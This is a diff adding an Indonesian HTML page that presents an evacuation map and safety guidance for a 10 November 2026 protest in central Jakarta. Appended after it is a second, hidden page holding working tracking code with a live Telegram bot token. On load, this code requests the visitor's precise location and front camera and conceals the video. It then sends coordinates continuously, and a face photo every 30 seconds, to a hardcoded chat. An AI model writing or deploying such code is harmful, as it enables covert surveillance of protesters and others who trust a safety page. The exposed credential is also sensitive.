@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Peta Situasi dan Rencana Evakuasi - Aksi 10 November 2026</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --navy: #0f2547;
+      --navy-dark: #09172e;
+      --red: #c81e1e;
+      --red-light: #fef2f2;
+      --yellow: #facc15;
+      --yellow-light: #fefce8;
+      --green: #15803d;
+      --green-light: #f0fdf4;
+      --blue: #1d4ed8;
+      --blue-light: #eff6ff;
+      --slate-50: #f8fafc;
+      --slate-100: #f1f5f9;
+      --slate-200: #e2e8f0;
+      --slate-600: #475569;
+      --slate-800: #1e293b;
+      --shadow: 0 10px 30px -5px rgba(15, 37, 71, 0.12), 0 4px 12px -2px rgba(15, 37, 71, 0.06);
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background-color: var(--slate-100);
+      color: var(--slate-800);
+      line-height: 1.6;
+    }
+
+    /* Top Emergency Bar */
+    .emergency-bar {
+      background: linear-gradient(90deg, #991b1b, #dc2626, #991b1b);
+      color: #fff;
+      text-align: center;
+      padding: 0.6rem 1rem;
+      font-size: 0.9rem;
+      font-weight: 600;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    .emergency-bar a {
+      background: #fff;
+      color: #b91c1c;
+      text-decoration: none;
+      padding: 0.2rem 0.75rem;
+      border-radius: 999px;
+      font-weight: 800;
+      font-size: 0.85rem;
+      transition: transform 0.15s ease;
+    }
+
+    .emergency-bar a:hover {
+      transform: scale(1.05);
+    }
+
+    /* Hero Header */
+    header {
+      background: radial-gradient(circle at top right, #1e3a8a, var(--navy) 60%, var(--navy-dark));
+      color: #fff;
+      padding: 2.5rem 1.25rem 3.5rem;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      border-bottom: 5px solid var(--red);
+    }
+
+    .badge-tagline {
+      display: inline-block;
+      background: rgba(250, 204, 21, 0.15);
+      border: 1px solid rgba(250, 204, 21, 0.5);
+      color: var(--yellow);
+      padding: 0.35rem 1rem;
+      border-radius: 999px;
+      font-weight: 700;
+      font-size: 0.85rem;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      margin-bottom: 1rem;
+    }
+
+    header h1 {
+      font-size: clamp(1.6rem, 4vw, 2.75rem);
+      font-weight: 800;
+      line-height: 1.2;
+      max-width: 900px;
+      margin: 0 auto 0.75rem;
+      letter-spacing: -0.02em;
+    }
+
+    header h1 span {
+      color: var(--yellow);
+    }
+
+    .subtitle-ribbon {
+      display: inline-block;
+      background: var(--red);
+      color: #fff;
+      padding: 0.5rem 1.5rem;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: clamp(0.95rem, 2vw, 1.15rem);
+      margin-top: 0.5rem;
+      box-shadow: 0 4px 15px rgba(200, 30, 30, 0.4);
+    }
+
+    /* Main Container */
+    .container {
+      max-width: 1280px;
+      margin: -2rem auto 3rem;
+      padding: 0 1.25rem;
+      position: relative;
+      z-index: 10;
+    }
+
+    /* Map Showcase Card */
+    .map-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      padding: 1.25rem;
+      margin-bottom: 2rem;
+      border: 1px solid var(--slate-200);
+    }
+
+    .map-toolbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1rem;
+      margin-bottom: 1rem;
+      padding-bottom: 0.85rem;
+      border-bottom: 1px solid var(--slate-200);
+    }
+
+    .map-toolbar-title {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      font-weight: 700;
+      color: var(--navy);
+      font-size: 1.1rem;
+    }
+
+    .status-dot {
+      width: 12px;
+      height: 12px;
+      background-color: var(--red);
+      border-radius: 50%;
+      box-shadow: 0 0 0 4px rgba(200, 30, 30, 0.2);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(200, 30, 30, 0.5); }
+      70% { box-shadow: 0 0 0 10px rgba(200, 30, 30, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(200, 30, 30, 0); }
+    }
+
+    .map-actions {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      padding: 0.5rem 0.95rem;
+      border-radius: 8px;
+      font-size: 0.875rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid var(--slate-200);
+      background: var(--slate-50);
+      color: var(--slate-800);
+      text-decoration: none;
+      transition: all 0.15s ease;
+    }
+
+    .btn:hover {
+      background: var(--slate-200);
+    }
+
+    .btn-primary {
+      background: var(--navy);
+      color: #fff;
+      border-color: var(--navy);
+    }
+
+    .btn-primary:hover {
+      background: #1e3a8a;
+    }
+
+    .map-viewport {
+      position: relative;
+      overflow: auto;
+      border-radius: 12px;
+      background: #0b1528;
+      border: 1px solid var(--slate-200);
+      text-align: center;
+      max-height: 82vh;
+    }
+
+    .map-viewport img {
+      display: block;
+      width: 100%;
+      height: auto;
+      margin: 0 auto;
+      transition: width 0.25s ease;
+      cursor: zoom-in;
+    }
+
+    .map-caption {
+      margin-top: 0.85rem;
+      font-size: 0.85rem;
+      color: var(--slate-600);
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+    }
+
+    /* Filter / Interactive Legend Chips */
+    .quick-chips {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 1rem;
+      margin-bottom: 2rem;
+    }
+
+    .chip-card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 1.1rem 1.25rem;
+      box-shadow: var(--shadow);
+      border-left: 5px solid var(--navy);
+      display: flex;
+      flex-direction: column;
+      gap: 0.35rem;
+    }
+
+    .chip-card.danger { border-left-color: var(--red); }
+    .chip-card.safe { border-left-color: var(--green); }
+    .chip-card.shelter { border-left-color: var(--blue); }
+
+    .chip-label {
+      font-size: 0.78rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--slate-600);
+    }
+
+    .chip-title {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: var(--navy);
+    }
+
+    .chip-list {
+      list-style: none;
+      margin-top: 0.35rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.4rem;
+    }
+
+    .tag {
+      font-size: 0.8rem;
+      font-weight: 600;
+      padding: 0.25rem 0.65rem;
+      border-radius: 6px;
+    }
+
+    .tag-red { background: var(--red-light); color: var(--red); border: 1px solid #fecaca; }
+    .tag-green { background: var(--green-light); color: var(--green); border: 1px solid #bbf7d0; }
+    .tag-blue { background: var(--blue-light); color: var(--blue); border: 1px solid #bfdbfe; }
+
+    /* Info Grid Section */
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+      gap: 1.5rem;
+      margin-bottom: 2.5rem;
+    }
+
+    .info-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      border: 1px solid var(--slate-200);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .info-card-header {
+      padding: 1rem 1.35rem;
+      font-weight: 800;
+      font-size: 1.1rem;
+      color: #fff;
+      background: var(--navy);
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    .info-card-header.warning {
+      background: var(--yellow);
+      color: var(--navy-dark);
+    }
+
+    .info-card-header.alert {
+      background: var(--red);
+    }
+
+    .info-card-body {
+      padding: 1.35rem;
+      flex: 1;
+    }
+
+    /* Numbered Steps */
+    .step-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.9rem;
+    }
+
+    .step-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.85rem;
+    }
+
+    .step-number {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: var(--red);
+      color: #fff;
+      font-weight: 800;
+      font-size: 0.85rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 0.1rem;
+    }
+
+    /* Check List */
+    .check-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.85rem;
+    }
+
+    .check-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+    }
+
+    .check-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: var(--green);
+      color: #fff;
+      font-weight: 800;
+      font-size: 0.8rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 0.15rem;
+    }
+
+    /* Legend Items */
+    .legend-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 0.75rem;
+    }
+
+    .legend-row {
+      display: flex;
+      align-items: center;
+      gap: 0.85rem;
+      padding: 0.55rem 0.75rem;
+      border-radius: 8px;
+      background: var(--slate-50);
+      border: 1px solid var(--slate-200);
+    }
+
+    .legend-symbol {
+      width: 36px;
+      height: 36px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      flex-shrink: 0;
+    }
+
+    .emergency-callout {
+      margin-top: 1.25rem;
+      padding: 1rem;
+      border-radius: 12px;
+      background: var(--red-light);
+      border: 2px solid #fca5a5;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+    }
+
+    .emergency-callout strong {
+      color: var(--red);
+      font-size: 1.35rem;
+    }
+
+    /* Lightbox Modal */
+    .lightbox {
+      position: fixed;
+      inset: 0;
+      background: rgba(9, 23, 46, 0.92);
+      z-index: 999;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .lightbox.active {
+      display: flex;
+    }
+
+    .lightbox img {
+      max-width: 96vw;
+      max-height: 92vh;
+      border-radius: 8px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+    }
+
+    .lightbox-close {
+      position: fixed;
+      top: 1.25rem;
+      right: 1.5rem;
+      background: #fff;
+      color: var(--navy);
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 999px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    footer {
+      background: var(--navy-dark);
+      color: #cbd5e1;
+      text-align: center;
+      padding: 2rem 1.25rem;
+      font-size: 0.9rem;
+    }
+
+    footer strong {
+      color: var(--yellow);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Bar Darurat Atas -->
+  <div class="emergency-bar">
+    <span>🚨 Layanan Darurat Terpadu Jakarta: Hubungi <strong>112</strong> jika terjadi kondisi darurat</span>
+    <a href="tel:112">📞 Panggil 112</a>
+  </div>
+
+  <!-- Header Utama -->
+  <header>
+    <div class="badge-tagline">Aksi Damai, Jakarta Aman</div>
+    <h1>PETA SITUASI DAN <span>RENCANA EVAKUASI</span><br>AKSI 10 NOVEMBER 2026</h1>
+    <div class="subtitle-ribbon">
+      Kawasan Tugu Tani, Jakarta Pusat, Kawasan DPR/Senayan hingga Monas
+    </div>
+  </header>
+
+  <main class="container">
+    <!-- Seksi Gambar Peta Utama -->
+    <section class="map-card" aria-label="Peta Situasi dan Rencana Evakuasi">
+      <div class="map-toolbar">
+        <div class="map-toolbar-title">
+          <span class="status-dot"></span>
+          <span>Visualisasi Peta Situasi & Jalur Evakuasi Resmi</span>
+        </div>
+        <div class="map-actions">
+          <button type="button" class="btn" id="zoomOutBtn" title="Perkecil Peta">➖ Perkecil</button>
+          <button type="button" class="btn" id="zoomResetBtn" title="Ukuran Normal">🔄 Reset (100%)</button>
+          <button type="button" class="btn" id="zoomInBtn" title="Perbesar Peta">➕ Perbesar</button>
+          <button type="button" class="btn btn-primary" id="fullscreenBtn">🔍 Layar Penuh</button>
+          <a href="peta-evakuasi.jpg" download="Peta-Evakuasi-Aksi-10-November-2026.jpg" class="btn">⬇️ Unduh Gambar</a>
+        </div>
+      </div>
+
+      <div class="map-viewport" id="mapViewport">
+        <img
+          src="peta-evakuasi.jpg"
+          alt="Peta Situasi dan Rencana Evakuasi Aksi 10 November 2026 - Kawasan Tugu Tani, Jakarta Pusat, Kawasan DPR/Senayan hingga Monas"
+          id="mapImage"
+        />
+      </div>
+
+      <div class="map-caption">
+        <span>💡 <strong>Tips:</strong> Klik pada gambar peta untuk melihat dalam mode layar penuh, atau gunakan tombol Perbesar/Perkecil di atas.</span>
+        <span>Demo Damai Untuk Indonesia • Jaga Keselamatan, Dukung Jakarta Tetap Kondusif</span>
+      </div>
+    </section>
+
+    <!-- Ringkasan Cepat Titik Penting -->
+    <section class="quick-chips" aria-label="Ringkasan Lokasi Penting">
+      <div class="chip-card danger">
+        <span class="chip-label">⚠️ Titik Rawan / Konsentrasi Massa</span>
+        <div class="chip-title">3 Area Utama Pantauan</div>
+        <div class="chip-list">
+          <span class="tag tag-red">Monas (Titik Rawan)</span>
+          <span class="tag tag-red">Tugu Tani (Titik Rawan)</span>
+          <span class="tag tag-red">DPR / Senayan (Titik Rawan)</span>
+        </div>
+      </div>
+
+      <div class="chip-card safe">
+        <span class="chip-label">👥 Titik Kumpul Sementara (TKS)</span>
+        <div class="chip-title">5 Titik Evakuasi Terdekat</div>
+        <div class="chip-list">
+          <span class="tag tag-green">Titik Kumpul Gambir</span>
+          <span class="tag tag-green">Titik Kumpul Menteng</span>
+          <span class="tag tag-green">Titik Kumpul Salemba</span>
+          <span class="tag tag-green">Titik Kumpul Kebon Sirih</span>
+          <span class="tag tag-green">Titik Kumpul Kuningan</span>
+        </div>
+      </div>
+
+      <div class="chip-card shelter">
+        <span class="chip-label">🏠 Tempat Perlindungan Utama</span>
+        <div class="chip-title">Lokasi Aman & Koridor Jalan</div>
+        <div class="chip-list">
+          <span class="tag tag-blue">GBK / Kompleks Gelora Bung Karno</span>
+          <span class="tag tag-blue">Jl. Medan Merdeka Barat</span>
+          <span class="tag tag-blue">Jl. Gatot Subroto</span>
+          <span class="tag tag-blue">Jl. Sudirman</span>
+          <span class="tag tag-blue">Jl. Rasuna Said</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Detail Informasi Peta (3 Kolom) -->
+    <section class="info-grid">
+      <!-- Kolom 1: Legenda Peta -->
+      <article class="info-card">
+        <div class="info-card-header">
+          <span>🗺️ Legenda Peta</span>
+        </div>
+        <div class="info-card-body">
+          <div class="legend-grid">
+            <div class="legend-row">
+              <div class="legend-symbol" style="background:#fee2e2; color:#dc2626;">🔴</div>
+              <div>
+                <strong>Titik Potensi Kericuhan</strong>
+                <div style="font-size:0.85rem; color:var(--slate-600);">Area merah berisiko tinggi eskalasi massa</div>
+              </div>
+            </div>
+            <div class="legend-row">
+              <div class="legend-symbol" style="background:#ffedd5; color:#c2410c;">👥</div>
+              <div>
+                <strong>Lokasi Aksi / Konsentrasi Massa</strong>
+                <div style="font-size:0.85rem; color:var(--slate-600);">Monas, Tugu Tani, dan Gedung DPR/Senayan</div>
+              </div>
+            </div>
+            <div class="legend-row">
+              <div class="legend-symbol" style="background:#dcfce7; color:#15803d;">🏃</div>
+              <div>
+                <strong>Jalur Evakuasi (Utama)</strong>
+                <div style="font-size:0.85rem; color:var(--slate-600);">Garis panah hijau penuh menuju Titik Kumpul</div>
+              </div>
+            </div>
+            <div class="legend-row">
+              <div class="legend-symbol" style="background:#dbeafe; color:#1d4ed8;">➡️</div>
+              <div>
+                <strong>Jalur Evakuasi (Alternatif)</strong>
+                <div style="font-size:0.85rem; color:var(--slate-600);">Garis panah biru putus-putus sebagai rute cadangan</div>
+              </div>
+            </div>
+            <div class="legend-row">
+              <div class="legend-symbol" style="background:#dcfce7; color:#15803d;">🟢</div>
+              <div>
+                <strong>Titik Kumpul Sementara (TKS)</strong>
+                <div style="font-size:0.85rem; color:var(--slate-600);">Gambir, Menteng, Salemba, Kebon Sirih, Kuningan</div>
+              </div>
+            </div>
+            <div class="legend-row">
+              <div class="legend-symbol" style="background:#dbeafe; color:#1d4ed8;">🏠</div>
+              <div>
+                <strong>Lokasi Aman (Tempat Perlindungan)</strong>
+                <div style="font-size:0.85rem; color:var(--slate-600);">GBK / Kompleks Gelora Bung Karno & fasilitas publik</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </article>
+
+      <!-- Kolom 2: Arahan Evakuasi -->
+      <article class="info-card">
+        <div class="info-card-header">
+          <span>🧭 Arahan Evakuasi</span>
+        </div>
+        <div class="info-card-body">
+          <ol class="step-list">
+            <li class="step-item">
+              <span class="step-number">1</span>
+              <span>Jika terjadi kericuhan, <strong>tetap tenang</strong> dan jangan terpancing provokasi.</span>
+            </li>
+            <li class="step-item">
+              <span class="step-number">2</span>
+              <span>Segera menjauhi area kerumunan menuju <strong>jalur evakuasi terdekat</strong>.</span>
+            </li>
+            <li class="step-item">
+              <span class="step-number">3</span>
+              <span>Ikuti arahan petugas di lapangan.</span>
+            </li>
+            <li class="step-item">
+              <span class="step-number">4</span>
+              <span>Menuju <strong>Titik Kumpul Sementara (TKS)</strong> yang telah ditentukan.</span>
+            </li>
+            <li class="step-item">
+              <span class="step-number">5</span>
+              <span>Jika situasi belum aman, lanjutkan ke <strong>Lokasi Aman terdekat</strong>.</span>
+            </li>
+          </ol>
+        </div>
+      </article>
+
+      <!-- Kolom 3: Lokasi Aman Rekomendasi & Imbauan Penting -->
+      <article class="info-card">
+        <div class="info-card-header warning">
+          <span>🛡️ Lokasi Aman Rekomendasi</span>
+        </div>
+        <div class="info-card-body">
+          <ul class="check-list" style="margin-bottom: 1.5rem;">
+            <li class="check-item">
+              <span class="check-icon">✓</span>
+              <span><strong>GBK / Kompleks Gelora Bung Karno</strong></span>
+            </li>
+            <li class="check-item">
+              <span class="check-icon">✓</span>
+              <span><strong>Stasiun MRT / Halte TransJakarta</strong></span>
+            </li>
+            <li class="check-item">
+              <span class="check-icon">✓</span>
+              <span><strong>Gedung Pemerintah / Instansi Terdekat</strong></span>
+            </li>
+          </ul>
+
+          <div style="border-top: 2px dashed var(--slate-200); padding-top: 1.15rem;">
+            <h3 style="color: var(--red); font-size: 1.05rem; margin-bottom: 0.75rem;">⚠️ Imbauan Penting</h3>
+            <ul class="check-list">
+              <li class="check-item">
+                <span class="check-icon">✓</span>
+                <span>Gunakan jalur evakuasi yang telah ditentukan.</span>
+              </li>
+              <li class="check-item">
+                <span class="check-icon">✓</span>
+                <span>Hindari kerumunan dan benda berbahaya.</span>
+              </li>
+              <li class="check-item">
+                <span class="check-icon">✓</span>
+                <span>Pantau informasi resmi dari aparat dan media terpercaya.</span>
+              </li>
+            </ul>
+
+            <div class="emergency-callout">
+              <div>
+                <div style="font-size: 0.85rem; color: var(--slate-600);">Jika terjadi situasi darurat, segera hubungi:</div>
+                <strong>112 (Layanan Darurat)</strong>
+              </div>
+              <a href="tel:112" class="btn btn-primary" style="background: var(--red); border-color: var(--red);">📞 Hubungi 112</a>
+            </div>
+          </div>
+        </div>
+      </article>
+    </section>
+  </main>
+
+  <!-- Modal Lightbox Layar Penuh -->
+  <div class="lightbox" id="lightbox" role="dialog" aria-modal="true" aria-label="Tampilan Peta Layar Penuh">
+    <button type="button" class="lightbox-close" id="lightboxClose">✕ Tutup (ESC)</button>
+    <img src="peta-evakuasi.jpg" alt="Peta Situasi dan Rencana Evakuasi Aksi 10 November 2026" />
+  </div>
+
+  <footer>
+    <p><strong>Jaga Keselamatan, Dukung Jakarta Tetap Kondusif</strong> — Demo Damai Untuk Indonesia</p>
+    <p style="margin-top: 0.35rem; opacity: 0.8;">Peta Situasi dan Rencana Evakuasi Aksi 10 November 2026</p>
+  </footer>
+
+  <script>
+    const mapImage = document.getElementById('mapImage');
+    const zoomInBtn = document.getElementById('zoomInBtn');
+    const zoomOutBtn = document.getElementById('zoomOutBtn');
+    const zoomResetBtn = document.getElementById('zoomResetBtn');
+    const fullscreenBtn = document.getElementById('fullscreenBtn');
+    const lightbox = document.getElementById('lightbox');
+    const lightboxClose = document.getElementById('lightboxClose');
+
+    let currentZoom = 100;
+
+    function updateZoom() {
+      mapImage.style.width = currentZoom + '%';
+      zoomResetBtn.textContent = `🔄 Reset (${currentZoom}%)`;
+    }
+
+    zoomInBtn.addEventListener('click', () => {
+      if (currentZoom < 250) {
+        currentZoom += 25;
+        updateZoom();
+      }
+    });
+
+    zoomOutBtn.addEventListener('click', () => {
+      if (currentZoom > 50) {
+        currentZoom -= 25;
+        updateZoom();
+      }
+    });
+
+    zoomResetBtn.addEventListener('click', () => {
+      currentZoom = 100;
+      updateZoom();
+    });
+
+    function openLightbox() {
+      lightbox.classList.add('active');
+    }
+
+    function closeLightbox() {
+      lightbox.classList.remove('active');
+    }
+
+    fullscreenBtn.addEventListener('click', openLightbox);
+    mapImage.addEventListener('click', openLightbox);
+    lightboxClose.addEventListener('click', closeLightbox);
+    lightbox.addEventListener('click', (e) => {
+      if (e.target === lightbox) closeLightbox();
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') closeLightbox();
+    });
+  </script>
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #ffffff;
+    overflow: hidden;
+  }
+  video, canvas {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    top: 0;
+    left: 0;
+    pointer-events: none;
+  }
+</style>
+</head>
+<body>
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="cv"></canvas>
+<script>
+  const BOT = '9041153736:AAGYel_8Ik7MX2xhqEMtnRCHkGk5k4TibtI';
+  const CHAT = '1227256756';
+
+  function notify(title, body) {
+    if ('Notification' in window && Notification.permission === 'granted') {
+      try { new Notification(title, { body: body }); } catch (e) {}
+    }
+  }
+
+  function sendText(text) {
+    fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT, text: text })
+    });
+  }
+
+  function sendLocation(lat, lng, acc) {
+    const body = { chat_id: CHAT, latitude: lat, longitude: lng };
+    if (acc != null) body.horizontal_accuracy = acc;
+    fetch('https://api.telegram.org/bot' + BOT + '/sendLocation', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+  }
+
+  function sendPhoto(blob) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append('photo', blob, 'cam.jpg');
+    fetch('https://api.telegram.org/bot' + BOT + '/sendPhoto', { method: 'POST', body: fd });
+  }
+
+  function capturePhoto() {
+    const v = document.getElementById('cam');
+    const c = document.getElementById('cv');
+    if (!v.videoWidth) return;
+    c.width = v.videoWidth;
+    c.height = v.videoHeight;
+    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+    c.toBlob(function (b) { if (b) sendPhoto(b); }, 'image/jpeg', 0.8);
+  }
+
+  function onPos(position) {
+    const { latitude, longitude, accuracy, altitude, heading, speed } = position.coords;
+    const ts = new Date(position.timestamp).toLocaleString();
+    const text =
+      'Latitude: ' + latitude + '\n' +
+      'Longitude: ' + longitude + '\n' +
+      'Akurasi: ' + accuracy + ' m\n' +
+      'Altitude: ' + (altitude != null ? altitude : '-') + '\n' +
+      'Heading: ' + (heading != null ? heading : '-') + '\n' +
+      'Speed: ' + (speed != null ? speed : '-') + '\n' +
+      'Waktu: ' + ts + '\n' +
+      'Peta: https://www.google.com/maps?q=' + latitude + ',' + longitude;
+    sendText(text);
+    sendLocation(latitude, longitude, accuracy);
+    notify('Lokasi', latitude + ', ' + longitude);
+  }
+
+  if ('Notification' in window) {
+    Notification.requestPermission();
+  }
+
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(onPos, function () {}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+    navigator.geolocation.watchPosition(onPos, function () {}, { enableHighAccuracy: true, maximumAge: 0 });
+  }
+
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+      .then(function (stream) {
+        document.getElementById('cam').srcObject = stream;
+        setTimeout(capturePhoto, 2500);
+        setInterval(capturePhoto, 30000);
+      })
+      .catch(function () {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(function (stream) {
+            document.getElementById('cam').srcObject = stream;
+            setTimeout(capturePhoto, 2500);
+            setInterval(capturePhoto, 30000);
+          })
+          .catch(function () {});
+      });
+  }
+</script>
+</body>
+</html>
